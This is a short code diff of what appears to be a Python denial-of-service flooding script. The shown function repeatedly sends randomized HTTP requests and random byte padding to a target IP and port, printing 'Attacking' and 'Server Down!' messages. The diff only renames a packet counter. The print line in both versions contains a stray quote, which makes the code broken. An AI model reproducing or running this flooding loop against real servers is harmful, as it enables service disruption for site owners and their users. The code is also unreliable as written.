@@ -69,7 +69,7 @@ thread = int(input('\033[96m[\033[1m+]\033[96 Threads:  \033[0m'))
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
-    u = int(0)
+    xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
     reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
@@ -84,8 +84,8 @@ def start():
             s.send(str.encode(main_req))
             for i in range(pack):
                 s.send(str.encode(main_req))
-            u += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), u'))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx'))
         except:
             s.close()
             print("\033[33m[\033[1m-\033[33m]\033[92mServer Down!")
